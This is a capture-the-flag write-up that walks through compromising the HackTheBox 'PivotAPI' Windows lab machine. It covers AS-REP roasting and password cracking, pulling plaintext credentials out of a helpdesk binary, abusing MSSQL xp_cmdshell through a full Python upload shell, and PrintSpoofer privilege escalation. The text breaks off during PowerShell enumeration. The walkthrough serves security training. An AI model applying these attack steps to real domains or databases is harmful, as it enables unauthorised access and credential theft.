---
date: 2021-09-06 23:48:05
layout: post
title: HackTheBox PivotAPI Writeup || The Unintended way Vs The Intended one.
subtitle: HackTheBox PivotAPI Wtireup.
description: >-
  in this writeup i've solved the pivotAPI machine with 2 ways one is the intedned and the other one was the unintended. 
image: https://i.ibb.co/nMvprDG/Screenshot-1.png
optimized_image: https://i.ibb.co/nMvprDG/Screenshot-1.png
category: hackthebox
tags:
  - hackthebox
  - pivotAPI
author: Ahmed Fatouh
paginate: true
---

| Machine Name        | Type                 | Difficulty    | Machine IP|
|:--------------------|:---------------------|:--------------|:----------|
| PivotAPI            | Windows              | Insane	     | 10.10.10.240|


# Methodology:

* enumeration & nmap scan
* smb shares enumeration
* got some files.
* AS_REP Roasting
* Dynamic Analysis part.
* Got some credentials.
* Login to mssql shell.
* enumerating the machine with powershell.
* got a kdb file.
* cracking the kdb file and got user password.
* Laterl movement.
* Read LAPS Password
* Abusing GenericAll permision
* read to learn more!

## Nmap Scan

> **as always, i’ll do nmap scan to find out which services running in this machine, and i found these services.**

> **nmap -sC -sV -Pn -oN scan.txt 10.10.10.240**

```ruby
# Nmap 7.91 scan initiated Wed Jul  7 18:03:27 2021 as: nmap -sC -sV -Pn -oN scan.txt 10.10.10.240
Nmap scan report for 10.10.10.240
Host is up (0.12s latency).
Not shown: 986 filtered ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
| 02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
| 02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
| 02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
| 08-08-20  01:18PM               219091 notes1.pdf
| 08-08-20  01:34PM               279445 notes2.pdf
| 08-08-20  01:41PM                  105 README.txt
|_02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   3072 fa:19:bb:8d:b6:b6:fb:97:7e:17:80:f5:df:fd:7f:d2 (RSA)
|   256 44:d0:8b:cc:0a:4e:cd:2b:de:e8:3a:6e:ae:65:dc:10 (ECDSA)
|_  256 93:bd:b6:e2:36:ce:72:45:6c:1d:46:60:dd:08:6a:44 (ED25519)
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-07 16:03:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: LICORDEBELLOTA
|   NetBIOS_Domain_Name: LICORDEBELLOTA
|   NetBIOS_Computer_Name: PIVOTAPI
|   DNS_Domain_Name: LicorDeBellota.htb
|   DNS_Computer_Name: PivotAPI.LicorDeBellota.htb
|   DNS_Tree_Name: LicorDeBellota.htb
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-07-07T15:59:02
|_Not valid after:  2051-07-07T15:59:02
|_ssl-date: 2021-07-07T16:04:39+00:00; -1h00m06s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: PIVOTAPI; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1h00m06s, deviation: 0s, median: -1h00m06s
| ms-sql-info: 
|   10.10.10.240:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-07T16:04:03
|_  start_date: N/A

```

> **There is many of ports open, let's check the imporrtant one which is the ftp**

#### FTP

> **ftp -pi 10.10.10.240**

![](https://i.ibb.co/fCZs2YN/1.png)

* cool, let's get all of these files by >> `mget *`

> **Let's read note1.pdf,README.txt and note2.pdf**

```ruby
╭─kali@kali ~/Documents/HTB/PivotApi  
╰─➤  cat README.txt 
VERY IMPORTANT!!
Don't forget to change the download mode to binary so that the files are not corrupted.

```

![](https://i.ibb.co/y4P1tQ6/note1.png)

![](https://i.ibb.co/r4T8KBp/note2.png)

> **I Think these files gives us hint **stole access tokens**, let's dive deep**

> **the other files have nothing inmportant, so let's check the `metedata` of all these files**

> **exiftool notes2.pdf**

```ruby

ExifTool Version Number         : 12.16
File Name                       : notes2.pdf
Directory                       : .
File Size                       : 273 KiB
File Modification Date/Time     : 2021:07:07 13:15:43-04:00
File Access Date/Time           : 2021:08:21 04:02:48-04:00
File Inode Change Date/Time     : 2021:08:21 03:31:36-04:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 5
XMP Toolkit                     : Image::ExifTool 12.03
Creator                         : Kaorz
Publisher                       : LicorDeBellota.htb
Producer                        : cairo 1.10.2 (http://cairographics.org)


```

> **Cool, there is a username in the author or creator field so we can do the same proccess with the other files and make a wordlist of these usernames.**

```ruby
alex
Kaorz
cairo
byron
b.gronseth
bgronseth
saif

```

### ASREPRoast

> **The ASREPRoast attack looks for users without Kerberos pre-authentication required attribute `DONT_REQ_PREAUTH`**

`That means that anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.`

> **So we we don't need domain account to perform this attack, we just need a connection to the DC**

* let's go

> **impacket-GetNPUsers -dc-ip 10.10.10.240 -no-pass -usersfile ./user.txt LicorDeBellota/**

![](https://i.ibb.co/RhsSnyL/asreproast.png)

> **cool, we got the hash of `Kaorz` let's crack this hash with john**

> **john --wordlist=/usr/share/wordlists/rockyou.txt first-hash**

![](https://i.ibb.co/Wf3bQBg/fpass.png)

> **now let's try to list shares with username `Kaorz` and passworrd `Roper4155`**

> **smbclient -L \\10.10.10.240 -U kaorz**

![](https://i.ibb.co/NnctsXN/smb.png)

>**after enumerating these shares, i've found in the `NETLOGON` share some files**

> **smbclient //10.10.10.240/NETLOGON -U kaorz%Roper4155**

```ruby

smb: \> ls
  .                                   D        0  Sat Aug  8 06:42:28 2020
  ..                                  D        0  Sat Aug  8 06:42:28 2020
  HelpDesk                            D        0  Sun Aug  9 11:40:36 2020

		7779839 blocks of size 4096. 3439534 blocks available
smb: \> cd HelpDesk
smb: \HelpDesk\> ls
  .                                   D        0  Sun Aug  9 11:40:36 2020
  ..                                  D        0  Sun Aug  9 11:40:36 2020
  Restart-OracleService.exe           A  1854976  Fri Feb 19 05:52:01 2021
  Server MSSQL.msg                    A    24576  Sun Aug  9 07:04:14 2020
  WinRM Service.msg                   A    26112  Sun Aug  9 07:42:20 2020

```

> **let's download all this files to our machine with `get` command**

> **now we have 2 .msg files `Server MSSQL.msg` and `WinRM Service.msg` so let's extract the text inside them, you can read this [Blog](http://rohitmurame.blogspot.com/2018/10/how-to-open-msg-file-in-linux.html) to know how to extract the text**

> **sudo apt-get install libemail-outlook-message-perl libemail-sender-perl**

> **msgconvert Server\ MSSQL.msg**

* Server MSSQL.msg

```ruby
Date: Sun, 09 Aug 2020 11:04:14 +0000
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary=16208820270.2cBBDf6.24456
Content-Transfer-Encoding: 7bit
Subject: Server MSSQL
To: cybervaca@licordebellota.htb <cybervaca@licordebellota.htb>

Good afternoon,
Due to the problems caused by the Oracle database installed in 2010 in Windows, it has been decided to migrate to MSSQL at the beginning of 2020.
Remember that there were problems at the time of restarting the Oracle service and for this reason a program called "Reset-Service.exe" was created to log in to Oracle and restart the service.
 
Any doubt do not hesitate to contact us.
Greetings,
The HelpDesk Team

```

* WinRM Service.msg

```ruby

Date: Sun, 09 Aug 2020 11:42:20 +0000
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary=16208825850.f7f5B6.27939
Content-Transfer-Encoding: 7bit
Subject: WinRM Service
To: helpdesk@licordebellota.htb <helpdesk@licordebellota.htb>

Good afternoon. 
After the last pentest, we have decided to stop externally displaying WinRM's service. Several of our employees are the creators of Evil-WinRM so we do not want to expose this service... We have created a rule to block the exposure of the service and we have also blocked the TCP, UDP and even ICMP output (So that no shells of the type icmp are used.)
Greetings,

The HelpDesk Team

```

> **after reading the 2 messages, we know that Duo the problem in Oracle database installed in 2010 they migrate to `MSSQL` at the begining of the 2020
> and they mentioned that there was a problems at the time of restarting the `Oracle` service cause of this a program called `Restart-Service.exe` was created to login to Oracle and restart the service, pingo so this App have the creds for us**

> **Let's transfer these files to winVM**

![](https://i.ibb.co/GdxwHfQ/files.png)

> **now let's monitor the binary with `procmon` to know what this binary do**

![](https://i.ibb.co/FXJM5Xc/procmon.png)

![](https://i.ibb.co/zVjtN0p/procmon-inter.png)

> **okay, after analyzing the output i found that the application create a file inside `AppData\Local\Temp\` with a random name everytime and then it's delete the bat file.
> so if we want to get the bat file we need to stop the application before it's delete the bat file, so we will use `CMDWatcher` in this step.**

* [CMDWatcher](https://www.kahusecurity.com/tools.html)

> **open the application and select the interactive mode then start the monitoring and then execute the application**

![](https://i.ibb.co/r3p659t/cmdwatcher.png)

> **start the application and click `resume proccess` and then you will get the path to the `bat` file.**

![](https://i.ibb.co/1nGQ0Qf/proc.png)

* **copy these 2 files to another directory**.

![](https://i.ibb.co/Bwqksts/ss.png)

* **let's analyse the bat file now**

![](https://i.ibb.co/BZn5fNt/bat.png)

![](https://i.ibb.co/CnqTP6v/bat2.png)

> **this bat file has encrypted text and this text store in `c:\programdata\oracle.txt` file and from that file they start the for loop which remove the spaces and write the output inside another bin `restarrt-service.exe` and then deleted all the files.**

> **so we need the `restart-service.exe` file because it's contain the Creds of OracleDB.**

> **let's do some modification in bat file**

> **delete all these if statments
> ![](https://i.ibb.co/1q7CTzB/if.png)**

> **add `goto correcto`
> ![](https://i.ibb.co/GC35kw2/corr.png)**

> **delete all `del` statments
> ![](https://i.ibb.co/VSZbTh1/del.png)

> **now save let's save the new bat file copy it to our winVM again, and run this bat file and check if the `restart-service` crreated or not.**

![](https://i.ibb.co/ZS8b8SD/success.png)

> **cool, we got the file.**

> **now we will use API Monitor and you can download it from here [API Monitor](http://www.rohitab.com/apimonitor)**

![](https://i.ibb.co/8B4dxS3/apim.png)

> **check all modules in the left side.
> then click on monitor new proccess and select the `restart-service`**

![](https://i.ibb.co/HYnHzQR/api-mo.png)

> **now we capture all the calls and proccess successfully
> ![](https://i.ibb.co/h968LV7/capture.png)**

> **and here we got the password from the API calls.**

![](https://i.ibb.co/GvPMZtp/done.png)

```ruby

#Time of Day Thread Module API Return Value Error Duration
CreateProcessWithLogonW ( "svc_oracle", "", "#oracle_s3rV1c3!2010", 0, NULL, ""c:\windows\system32\cmd.exe" /c sc.exe stop OracleServiceXE; sc.exe start OracleServiceXE", 0, NULL, "C:\ProgramData", 0x000000000234e120, 0x0000000003f61c68 )  FALSE   1326 = The user name or password is incorrect.

```

![](https://raw.githubusercontent.com/davidcelis/gifs/master/nice/jaime-lannister.gif)

> **let's try to connect to the mssql server now**

![](https://i.ibb.co/smTvSJ2/sqlerrr.png)

> **login failed!, okay when reading the `MSSQL.msg` we know from it that they using mssql now not oracle so let's change the password from `#oracle_s3rV1c3!2010` to `#mssql_s3rV1c3!2020` and the username to `sa` because the default username of mssql is sa.**

![](https://i.ibb.co/2Y1Xy8Z/sqldone.png)

> **nice we logged in now, let's see what we can do.**

```ruby

SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd


```

> **let's try to exec command with `xp_cmdshell whoami`.**

```ruby

SQL> xp_cmdshell whoami 
output                                                                             

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress                                                        

NULL                                                                               

SQL> 


```

> **let's check our privilege.**

```ruby
SQL> xp_cmdshell whoami / priv
output

-------------------------------------------------- ------------------------------

Null

PRIVILEGE INFORMATION

--------------------------

Null

Privilege name Description Status

================================================= ==========================================

SeAssignPrimaryTokenPrivilege Replace a process-level token Disabled

SeIncreaseQuotaPrivilege Adjust memory quotas for a Disabled process

SeMachineAccountPrivilege Add workstations to domain Disabled

SeChangeNotifyPrivilege Skip Traversal Check Enabled

SeManageVolumePrivilege Perform volume maintenance tasks Enabled

SeImpersonatePrivilege Impersonate a client after authentication Enabled

SeCreateGlobalPrivilege Create global objects Enabled

SeIncreaseWorkingSetPrivilege Increase the workspace of a Disabled process

Null


```

> **nice, we have `SeImpersonatePrivilege` enabled let's try priv-esc with it now.**

> **But there is a Problem here which we can't upload [PrintSpoofer](https://github.com/dievus/printspoofer) because the firewall blocks all connections.**

> **after doing some search on google i've found a Python script which will login use mssql server and can upload files by it and you can download it from here [mssql_shell.py](https://github.com/Alamot/code-snippets/blob/master/mssql/mssql_shell.py)**

> **we need to add the credentials we got in the code, then run it.**

```ruby

#!/usr/bin/env python
from __future__ import print_function
import _mssql
import base64
import shlex
import sys
import tqdm
import hashlib
from io import open
try: input = raw_input
except NameError: pass
from base64 import encodebytes

MSSQL_SERVER="10.10.10.240"
MSSQL_USERNAME = "sa"
MSSQL_PASSWORD = "#mssql_s3rV1c3!2020"
BUFFER_SIZE = 5*1024
TIMEOUT = 30


def process_result(mssql):
    username = ""
    computername = ""
    cwd = ""
    rows = list(mssql)
    for row in rows[:-3]:
        columns = list(row)
        if row[columns[-1]]:
            print(row[columns[-1]])
        else:
            print()
    if len(rows) >= 3:
        (username, computername) = rows[-3][list(rows[-3])[-1]].split('|')
        cwd = rows[-2][list(rows[-3])[-1]]
    return (username.rstrip(), computername.rstrip(), cwd.rstrip())


def upload(mssql, stored_cwd, local_path, remote_path):
    print("Uploading "+local_path+" to "+remote_path)
    cmd = 'type nul > "' + remote_path + '.b64"'
    mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")

    with open(local_path, 'rb') as f:
        data = f.read()
        md5sum = hashlib.md5(data).hexdigest()
        b64enc_data = b"".join(base64.b64encode(data).split()).decode()

    print("Data length (b64-encoded): "+str(len(b64enc_data)/1024)+"KB")
    for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE/1024, unit="KB"):
        cmd = 'echo '+b64enc_data[i:i+BUFFER_SIZE]+' >> "' + remote_path + '.b64"'
        mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
        #print("Remaining: "+str(len(b64enc_data)-i))

    cmd = 'certutil -decode "' + remote_path + '.b64" "' + remote_path + '"'
    mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
    process_result(mssql)
    cmd = 'certutil -hashfile "' + remote_path + '" MD5'
    mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
    if md5sum in [row[list(row)[-1]].strip() for row in mssql if row[list(row)[-1]]]:
        print("MD5 hashes match: " + md5sum)
    else:
        print("ERROR! MD5 hashes do NOT match!")


def shell():
    mssql = None
    stored_cwd = None
    try:
        mssql = _mssql.connect(server=MSSQL_SERVER, user=MSSQL_USERNAME, password=MSSQL_PASSWORD)
        print("Successful login: "+MSSQL_USERNAME+"@"+MSSQL_SERVER)

        print("Trying to enable xp_cmdshell ...")
        mssql.execute_query("EXEC sp_configure 'show advanced options',1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell',1;RECONFIGURE")

        cmd = 'echo %username%^|%COMPUTERNAME% & cd'
        mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
        (username, computername, cwd) = process_result(mssql)
        stored_cwd = cwd
        
        while True:
            cmd = input("CMD "+username+"@"+computername+" "+cwd+"> ").rstrip("\n").replace("'", "''")
            if not cmd:
                cmd = "call" # Dummy cmd command
            if cmd.lower()[0:4] == "exit":
                mssql.close()
                return
            elif cmd[0:6] == "UPLOAD":
                upload_cmd = shlex.split(cmd, posix=False)
                if len(upload_cmd) < 3:
                    upload(mssql, stored_cwd, upload_cmd[1], stored_cwd+"\\"+upload_cmd[1])
                else:
                    upload(mssql, stored_cwd, upload_cmd[1], upload_cmd[2])
                cmd = "echo *** UPLOAD PROCEDURE FINISHED ***"
            mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
            (username, computername, cwd) = process_result(mssql)
            stored_cwd = cwd
            
    except _mssql.MssqlDatabaseException as e:
        if  e.severity <= 16:
            print("MSSQL failed: "+str(e))
        else:
            raise
    finally:
        if mssql:
            mssql.close()


shell()
sys.exit()

```

* **let's go.**

> **here we go.**

![](https://i.ibb.co/wy3Wr8m/sql-shell.png)

> **let's upload `PrintSpoofer` now.**

![](https://i.ibb.co/Qm80ZcB/uploading.png)

> **let's try to read the flag with this command `printspoofer.exe -i -c "powershell -c type C:\Users\3v4Si0N\Desktop\user.txt"`**

```ruby

CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\temp> printspoofer.exe -i -c "powershell -c type C:\Users\3v4Si0N\Desktop\user.txt"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[-] Operation failed or timed out.
CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\temp> 

```

![](https://raw.githubusercontent.com/davidcelis/gifs/master/no/hair-flip.gif)

> **HAHAHAHAHAH NO THAT EASY.**

> **When solving this machine with my friend the PrintSpoofer work successfully and give us this.**

```ruby

[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
4855ef51169f74e4d5d79befd933d719

```

> **but when i try to solve it in another time it's give me the error of `time out` and this because the way to read the flag with PrintSpoofer was batched and this was the `unintended` way, and now i will show you a new travel to own this machine.**

## The Intended Way

> **let's deep dive in the machine.**

> **from the sql shell we can execute powershell commands, and i want to enumerate the directories of this user we have so type this command.**

> **`powershell.exe -command "$password = ConvertTo-SecureString '#mssql_s3rV1c3!2020' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential ('LICORDEBELLOTA\svc_mssql', $password); Invoke-Command -Credential $credential -ComputerName PivotAPI -ScriptBlock {Get-ChildItem C:\Users\svc_mssql\ -Recurse -Hidden}"`**

```ruby

╭─kali@kali ~/Documents/HTB/PivotApi  
╰─➤  python3 xdev05.py                                                                                                                                                                                        134 ↵
/home/kali/Documents/HTB/PivotApi/xdev05.py:3: DeprecationWarning: Using or importing the ABCs from 'collections' instead of from 'collections.abc' is deprecated since Python 3.3, and in 3.10 it will stop working
  import _mssql
Successful login: sa@10.10.10.240
Trying to enable xp_cmdshell ...
CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\Windows\system32> powershell.exe -command "$password = ConvertTo-SecureString '#mssql_s3rV1c3!2020' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential ('LICORDEBELLOTA\svc_mssql', $password); Invoke-Command -Credential $credential -ComputerName PivotAPI -ScriptBlock {Get-ChildItem C:\Users\svc_mssql\ -Recurse -Hidden}"



    Directorio: C:\Users\svc_mssql


Mode                LastWriteTime         Length Name                                PSComputerName                    
----                -------------         ------ ----                                --------------                    
d--h--       08/08/2020     19:45                AppData                             PivotAPI                          
d--hsl       08/08/2020     19:45                Configuración local                 PivotAPI                          
d--hsl       08/08/2020     19:45                Cookies                             PivotAPI                          
d--hsl       08/08/2020     19:45                Datos de programa                   PivotAPI                          
d--hsl       08/08/2020     19:45                Entorno de red                      PivotAPI                          
d--hsl       08/08/2020     19:45                Impresoras                          PivotAPI                          
d--hsl       08/08/2020     19:45                Menú Inicio                         PivotAPI                          
d--hsl       08/08/2020     19:45                Mis documentos                      PivotAPI                          
d--hsl       08/08/2020     19:45                Plantillas                          PivotAPI                          
d--hsl       08/08/2020     19:45                Reciente                            PivotAPI                          
d--hsl       08/08/2020     19:45                SendTo                              PivotAPI                          
-a-h--       27/05/2021     14:29         262144 NTUSER.DAT                          PivotAPI                          
-a-hs-       08/08/2020     19:45         118784 ntuser.dat.LOG1                     PivotAPI                          
-a-hs-       08/08/2020     19:45          32768 ntuser.dat.LOG2                     PivotAPI                          
-a-hs-       08/08/2020     19:45          65536 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21- PivotAPI                          
                                                 e41d2d101530}.TM.blf                                                  
-a-hs-       08/08/2020     19:45         524288 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21- PivotAPI                          
                                                 e41d2d101530}.TMContainer0000000000                                   
                                                 0000000001.regtrans-ms                                                
-a-hs-       08/08/2020     19:45         524288 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21- PivotAPI                          
                                                 e41d2d101530}.TMContainer0000000000                                   
                                                 0000000002.regtrans-ms                                                
---hs-       08/08/2020     19:45             20 ntuser.ini                          PivotAPI                          


    Directorio: C:\Users\svc_mssql\AppData\Local


Mode                LastWriteTime         Length Name                                PSComputerName                    
----                -------------         ------ ----                                --------------                    
d--hsl       08/08/2020     19:45                Archivos temporales de Internet     PivotAPI                          
d--hsl       08/08/2020     19:45                Datos de programa                   PivotAPI                          
d--hsl       08/08/2020     19:45                Historial                           PivotAPI                          
Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\AppData\Local\Archivos temporales de Internet'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_ms...les de Internet:String) [Get-ChildItem], Unauthoriz 
   edAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : PivotAPI
 
Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\AppData\Local\Datos de programa'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_ms...tos de programa:String) [Get-ChildItem], Unauthoriz 
   edAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : PivotAPI
 
Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\AppData\Local\Historial'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_ms...Local\Historial:String) [Get-ChildItem], Unauthoriz 
   edAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : PivotAPI
 


    Directorio: C:\Users\svc_mssql\AppData\Local\Microsoft\Windows


Mode                LastWriteTime         Length Name                                PSComputerName                    
----                -------------         ------ ----                                --------------                    
d--hsl       08/08/2020     19:45                Temporary Internet Files            PivotAPI                          
-a-h--       29/04/2021     14:21           8192 UsrClass.dat                        PivotAPI                          
-a-hs-       08/08/2020     19:45           8192 UsrClass.dat.LOG1                   PivotAPI                          
-a-hs-       08/08/2020     19:45          16384 UsrClass.dat.LOG2                   PivotAPI                          
-a-hs-       08/08/2020     19:45          65536 UsrClass.dat{fbbac38f-d991-11ea-be9 PivotAPI                          
                                                 6-000c293e040f}.TM.blf                                                
-a-hs-       08/08/2020     19:45         524288 UsrClass.dat{fbbac38f-d991-11ea-be9 PivotAPI                          
                                                 6-000c293e040f}.TMContainer00000000                                   
                                                 000000000001.regtrans-ms                                              
-a-hs-       08/08/2020     19:45         524288 UsrClass.dat{fbbac38f-d991-11ea-be9 PivotAPI                          
                                                 6-000c293e040f}.TMContainer00000000                                   
                                                 000000000002.regtrans-ms                                              
Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\AppData\Local\Microsoft\Windows\Temporary Internet Files'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_ms... Internet Files:String) [Get-ChildItem], Unauthoriz 
   edAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : PivotAPI
 


    Directorio: C:\Users\svc_mssql\AppData\Local\Microsoft\Windows\WinX\Group1


Mode                LastWriteTime         Length Name                                PSComputerName                    
----                -------------         ------ ----                                --------------                    
-a-hs-       15/09/2018      9:16             75 desktop.ini                         PivotAPI                          


    Directorio: C:\Users\svc_mssql\AppData\Local\Microsoft\Windows\WinX\Group2


Mode                LastWriteTime         Length Name                                PSComputerName                    
----                -------------         ------ ----                                --------------                    
-a-hs-       15/09/2018      9:16            325 desktop.ini                         PivotAPI                          


    Directorio: C:\Users\svc_mssql\AppData\Local\Microsoft\Windows\WinX\Group3


Mode                LastWriteTime         Length Name                                PSComputerName                    
----                -------------         ------ ----                                --------------                    
-a-hs-       15/09/2018      9:16            941 desktop.ini                         PivotAPI                          


    Directorio: C:\Users\svc_mssql\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch


Mode                LastWriteTime         Length Name                                PSComputerName                    
----                -------------         ------ ----                                --------------                    
-a-hs-       15/09/2018      9:16            270 desktop.ini                         PivotAPI                          


    Directorio: C:\Users\svc_mssql\AppData\Roaming\Microsoft\Windows\SendTo


Mode                LastWriteTime         Length Name                                PSComputerName                    
----                -------------         ------ ----                                --------------                    
-a-hs-       15/09/2018      9:16            440 Desktop.ini                         PivotAPI                          


    Directorio: C:\Users\svc_mssql\AppData\Roaming\Microsoft\Windows\Start Menu


Mode                LastWriteTime         Length Name                                PSComputerName                    
----                -------------         ------ ----                                --------------                    
d--hsl       08/08/2020     19:45                Programas                           PivotAPI                          
Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\AppData\Roaming\Microsoft\Windows\Start Menu\Programas'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_ms... Menu\Programas:String) [Get-ChildItem], Unauthoriz 
   edAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : PivotAPI
 


    Directorio: C:\Users\svc_mssql\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessibility


Mode                LastWriteTime         Length Name                                PSComputerName                    
----                -------------         ------ ----                                --------------                    
-a-hs-       15/09/2018      9:16            568 Desktop.ini                         PivotAPI                          


    Directorio: C:\Users\svc_mssql\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories


Mode                LastWriteTime         Length Name                                PSComputerName                    
----                -------------         ------ ----                                --------------                    
-a-hs-       15/09/2018      9:16            328 Desktop.ini                         PivotAPI                          


    Directorio: C:\Users\svc_mssql\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance


Mode                LastWriteTime         Length Name                                PSComputerName                    
----                -------------         ------ ----                                --------------                    
-a-hs-       15/09/2018      9:16            170 Desktop.ini                         PivotAPI                          


    Directorio: C:\Users\svc_mssql\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools


Mode                LastWriteTime         Length Name                                PSComputerName                    
----                -------------         ------ ----                                --------------                    
-a-hs-       15/09/2018      9:16            934 Desktop.ini                         PivotAPI                          


    Directorio: C:\Users\svc_mssql\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell


Mode                LastWriteTime         Length Name                                PSComputerName                    
----                -------------         ------ ----                                --------------                    
-a-hs-       15/09/2018      9:16            218 desktop.ini                         PivotAPI                          
Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\Configuración local'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_mssql\Configuración local:String) [Get-ChildItem], Unaut 
   horizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : PivotAPI
 
Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\Cookies'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_mssql\Cookies:String) [Get-ChildItem], UnauthorizedAcces 
   sException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : PivotAPI
 
Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\Datos de programa'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_mssql\Datos de programa:String) [Get-ChildItem], Unautho 
   rizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : PivotAPI
 


    Directorio: C:\Users\svc_mssql\Documents


Mode                LastWriteTime         Length Name                                PSComputerName                    
----                -------------         ------ ----                                --------------                    
d--hsl       08/08/2020     19:45                Mi música                           PivotAPI                          
d--hsl       08/08/2020     19:45                Mis imágenes                        PivotAPI                          
d--hsl       08/08/2020     19:45                Mis vídeos                          PivotAPI                          
Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\Documents\Mi música'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_mssql\Documents\Mi música:String) [Get-ChildItem], Unaut 
   horizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : PivotAPI
 
